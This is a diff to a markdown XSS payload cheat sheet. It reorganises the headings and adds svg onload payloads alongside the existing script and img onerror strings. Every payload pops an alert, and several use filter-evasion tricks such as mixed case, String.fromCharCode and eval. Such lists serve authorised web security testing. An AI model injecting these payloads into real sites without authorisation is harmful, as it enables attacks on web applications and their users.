@@ -1,6 +1,7 @@
 # XSS Payload
 
-## Basic XSS
+## XSS in HTML/Applications
+### Basic XSS
 
 ```
 <script>alert(123);</script>
@@ -17,8 +18,8 @@
 ‘; alert(1);
 ‘)alert(1);//
 ```
+### Img payload
 ```
-Img payload
 <ScRiPt>alert(1)</sCriPt>
 <IMG SRC=jAVasCrIPt:alert(‘XSS’)>
 <IMG SRC=”javascript:alert(‘XSS’);”>
@@ -33,5 +34,16 @@ Img payload
 <img src=x:alert(alt) onerror=eval(src) alt=xss>
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+```
+### Svg payload
+```
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
 
 ```
